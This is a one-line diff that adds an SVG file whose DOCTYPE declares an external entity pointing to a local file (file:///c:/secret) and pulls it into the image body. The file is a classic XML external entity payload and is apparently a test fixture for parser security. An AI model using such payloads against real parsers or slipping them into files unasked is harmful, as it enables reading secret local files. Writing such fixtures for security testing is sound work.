@@ -1,0 +1,1 @@
+<!DOCTYPE svg [<!ENTITY x SYSTEM 'file:///c:/secret'>]><svg>&x;</svg>
